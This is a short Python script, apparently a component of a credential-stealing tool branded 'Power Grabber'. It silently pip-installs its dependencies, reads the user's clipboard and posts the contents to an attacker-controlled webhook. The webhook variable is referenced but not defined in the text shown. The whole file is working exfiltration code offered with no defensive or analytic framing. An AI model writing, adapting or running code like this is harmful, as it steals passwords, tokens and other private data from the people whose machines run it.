import subprocess
import sys
import json
def install(package):
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])
try:
    import pyperclip
except ImportError:
    install('pyperclip')
    import pyperclip
try:
    import requests
except ImportError:
    install('requests')
    import requests
def send_to_webhook(content):
    embed = {
        "description": content,
        "color": 0x8B0000,
        "footer": {
            "text": f"Power Grabber | Made by Powercascade and Taktikal.exe"
        }
    }
    payload = {
        "embeds": [embed],
        "username": "Power Grabber",
        "avatar_url": "https://github.com/Powercascade/Power-grabber/blob/main/Power%20Grabber.png?raw=true"
    }
    headers = {
        "Content-Type": "application/json"
    }
    requests.post(webhook_url, data=json.dumps(payload), headers=headers)
clipboard_content = pyperclip.paste()
send_to_webhook(clipboard_content)
